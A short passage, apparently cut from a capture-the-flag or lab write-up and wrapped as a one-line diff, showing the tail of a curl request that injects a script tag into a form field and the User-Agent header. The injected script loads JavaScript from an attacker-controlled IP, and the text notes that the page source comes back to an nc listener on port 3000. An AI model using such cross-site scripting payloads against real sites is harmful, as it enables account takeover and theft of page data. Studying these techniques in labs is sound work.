@@ -1,0 +1,1 @@
+ript+src%3D%22http%3A%2F%2F10.10.14.11%22%3E%3C%2Fscript%3E&submit=submit' -H 'User-Agent: <script src="http://10.10.14.11/ftp-create-get.js"></script>' The page source is returned to nc listening on TCP 3000: <!DOCTYPE html> <html> <head> <title> FTP Hosting
